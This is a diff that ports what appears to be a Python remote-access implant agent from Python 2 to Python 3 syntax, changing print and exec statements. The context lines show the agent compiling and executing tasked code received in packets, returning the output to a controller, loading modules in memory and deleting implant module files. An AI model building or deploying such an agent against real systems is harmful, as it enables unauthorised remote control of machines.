@@ -1,3 +1,4 @@
+from __future__ import print_function
 import __future__
 import struct
 import time
@@ -242,7 +243,7 @@ def process_job_tasking(result):
         # send packets
         send_message(resultPackets)
     except Exception as e:
-        print "processJobTasking exception:",e
+        print("processJobTasking exception:",e)
         pass
 
 
@@ -380,7 +381,7 @@ def process_packet(packetType, data, resultID):
             buffer = StringIO()
             sys.stdout = buffer
             code_obj = compile(data, '<string>', 'exec')
-            exec code_obj in globals()
+            exec(code_obj, globals())
             sys.stdout = sys.__stdout__
             results = buffer.getvalue()
             return build_response_packet(100, str(results), resultID)
@@ -397,7 +398,7 @@ def process_packet(packetType, data, resultID):
             buffer = StringIO()
             sys.stdout = buffer
             code_obj = compile(data, '<string>', 'exec')
-            exec code_obj in globals()
+            exec(code_obj, globals())
             sys.stdout = sys.__stdout__
             c = compress()
             start_crc32 = c.crc32_data(buffer.getvalue())
@@ -428,7 +429,7 @@ def process_packet(packetType, data, resultID):
                 os.remove(implantPath)
                 result += "\n[*] Module path was properly removed: %s" %(implantPath)
             except Exception as e:
-                print "error removing module filed: %s" %(e)
+                print("error removing module filed: %s" %(e))
             fileCheck = os.path.isfile(implantPath)
             if fileCheck:
                 result += "\n\nError removing module file, please verify path: " + str(implantPath)
@@ -455,7 +456,7 @@ def process_packet(packetType, data, resultID):
             buffer = StringIO()
             sys.stdout = buffer
             code_obj = compile(script, '<string>', 'exec')
-            exec code_obj in globals()
+            exec(code_obj, globals())
             sys.stdout = sys.__stdout__
             result = str(buffer.getvalue())
             return build_response_packet(121, result, resultID)
@@ -590,7 +591,7 @@ class CFinder(object):
         mod.__name__ = fullname
         if is_package:
             mod.__path__ = [os.path.dirname(mod.__file__)]
-        exec code in mod.__dict__
+        exec(code, mod.__dict__)
         return mod
 
     def get_data(self, fullpath):
@@ -796,7 +797,7 @@ def start_job(code):
     code_obj = compile(codeBlock, '<string>', 'exec')
     # code needs to be in the global listing
     # not the locals() scope
-    exec code_obj in globals()
+    exec(code_obj, globals())
 
     # create/processPacketstart/return the thread
     # call the job_func so sys data can be cpatured
@@ -829,7 +830,7 @@ def job_message_buffer(message):
 
         jobMessageBuffer += str(message)
     except Exception as e:
-        print e
+        print(e)
 
 def get_job_message_buffer():
     global jobMessageBuffer
@@ -1054,5 +1055,5 @@ while(True):
             # print "invalid code:",code
 
     except Exception as e:
-        print "main() exception: %s" % (e)
+        print("main() exception: %s" % (e))
 
